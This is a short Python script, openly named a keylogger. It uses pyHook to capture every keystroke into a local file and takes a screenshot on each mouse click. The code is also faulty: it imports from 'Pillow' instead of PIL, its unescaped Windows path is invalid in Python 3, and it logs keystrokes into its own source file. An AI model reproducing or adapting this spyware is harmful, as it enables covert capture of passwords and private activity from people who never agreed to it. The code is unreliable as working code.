from Pillow import ImageGrab
import pythoncom, pyHook, sys
import time, threading

print("keylogger")


def OnKeyboardEvent(event):
    file = open('C:\Users\DELL\PycharmProjects\pythonProject\keylogger.py', 'a')
    msg = str(chr(event.Ascii))
    file.write(msg)
    return True


def shot():
    im = ImageGrab.grab()
    name = time.ctime().replace(':', '-')
    im.save(name + '.jpg')
    print('taken')
    time.sleep(10)


def OnMouseEvent(event):
    shot_thr = threading.Thread(target=shot, args=())
    shot_thr.daemon = True
    shot_thr.start()
    print('done')
    return True


hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.MouseAllButtonsDown = OnMouseEvent
hm.HookMouse()
hm.HookKeyboard()
pythoncom.PumpMessages()